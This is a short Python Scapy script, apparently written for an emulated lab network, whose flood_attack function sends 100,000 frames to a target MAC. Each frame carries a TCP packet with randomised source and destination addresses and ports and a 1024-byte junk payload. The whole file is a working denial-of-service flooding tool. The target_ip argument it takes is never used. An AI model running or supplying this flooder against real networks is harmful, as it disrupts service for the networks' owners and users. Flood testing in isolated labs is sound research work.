from scapy.all import *
import random

def generate_packet():
    src_ip = "10.0.0." + str(random.randint(1, 254))
    dst_ip = "10.0.0." + str(random.randint(1, 254))
    src_port = random.randint(1024, 65535)
    dst_port = random.randint(1024, 65535)
    packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port)/Raw(load="X"*1024)
    return packet

def flood_attack(target_ip, target_mac, iface, num_packets):
    for _ in range(num_packets):
        packet = generate_packet()
        sendp(Ether(dst=target_mac)/packet, iface=iface, verbose=0)

if __name__ == "__main__":
    target_ip = "10.0.0.1"
    target_mac = "00:00:00:00:00:01"
    iface = "h1-eth0"
    num_packets = 100000
    flood_attack(target_ip, target_mac, iface, num_packets)
